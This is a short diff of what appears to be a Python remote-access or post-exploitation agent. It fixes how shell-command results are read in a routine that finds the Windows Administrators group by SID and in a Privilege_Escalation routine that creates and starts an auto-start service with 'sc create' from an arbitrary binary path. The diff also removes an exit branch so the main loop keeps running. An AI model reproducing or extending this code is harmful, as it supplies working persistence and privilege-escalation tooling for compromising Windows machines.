@@ -315,7 +315,7 @@ class Miscellaneous:
 	 
 	@windows_only
 	def name_of_admin_group(self): # Get name of Administrators group.
-		for line in execute.execute_shell_command("whoami /groups").splitlines():
+		for line in execute.execute_shell_command("whoami /groups")[1].splitlines():
 			if "S-1-5-32-544" in line:
 				return line.split()[0].split("\\")[1]
 		
@@ -348,7 +348,7 @@ class Privilege_Escalation:
 		
 	@windows_only
 	def create_service(self, path, name):
-		if execute.execute_shell_command("sc create "+name+" binPath= "+path+" start= auto") != 0:
+		if execute.execute_shell_command("sc create "+name+" binPath= "+path+" start= auto")[0] != 0:
 			return False
 		execute.execute_shell_command("sc start "+name)
 		return True
@@ -433,5 +433,3 @@ while True:
 			try: t.stop()
 			except: pass
 		time.sleep(5)
-		
-	else: os._exit(0)
